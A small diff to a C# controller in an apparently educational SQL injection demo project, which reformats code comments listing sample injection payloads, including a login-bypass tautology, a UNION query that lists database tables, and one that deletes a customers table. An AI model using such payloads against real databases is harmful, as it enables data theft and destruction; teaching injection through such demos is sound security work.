@@ -17,7 +17,8 @@ namespace iSecurity.SqlInjection.Controllers
 
         public IActionResult Index(string searchTerm = "Taheri")
         {
-            //SqlInjection Query: a' or 1=1;--
+            //SqlInjection Query:
+            //a' or 1=1;--
             //a' OR 1=1 UNION ALL SELECT '1','1','1';--
             //a' OR 1=1 UNION ALL SELECT object_id, name, '1' from sys.tables;--
             //a' OR 1=1; DELETE customers;--
